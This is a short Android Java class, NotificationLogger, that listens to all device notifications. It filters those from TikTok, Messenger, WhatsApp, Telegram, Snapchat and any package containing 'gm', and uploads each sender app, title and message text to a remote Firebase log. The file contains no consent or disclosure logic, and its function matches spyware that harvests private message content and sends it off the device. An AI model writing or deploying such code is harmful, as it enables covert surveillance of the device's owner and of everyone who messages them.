
package com.example.app;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationLogger extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pack = sbn.getPackageName();
        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

        if (pack != null && (pack.contains("tiktok") || pack.contains("gm") || pack.contains("messenger") ||
                pack.contains("whatsapp") || pack.contains("telegram") || pack.contains("snapchat"))) {
            String log = String.format("%s: %s - %s", pack,
                    title != null ? title : "(no title)",
                    text != null ? text : "(no text)");
            FirebaseClient.pushLog(getApplicationContext(), "notifications", log);
        }
    }
}
